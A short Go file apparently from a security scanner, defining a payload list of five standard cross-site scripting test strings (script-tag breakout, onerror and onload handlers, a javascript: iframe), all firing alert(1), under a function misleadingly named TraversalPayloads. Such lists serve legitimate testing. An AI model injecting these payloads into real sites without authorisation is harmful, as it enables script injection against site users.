package payloads

func TraversalPayloads() []string {
	return []string{
		`"><script>alert(1)</script>`,
		`<img src=x onerror=alert(1)>`,
		`<svg/onload=alert(1)>`,
		`<body onload=alert(1)>`,
		`<iframe src="javascript:alert(1)">`,
	}
}
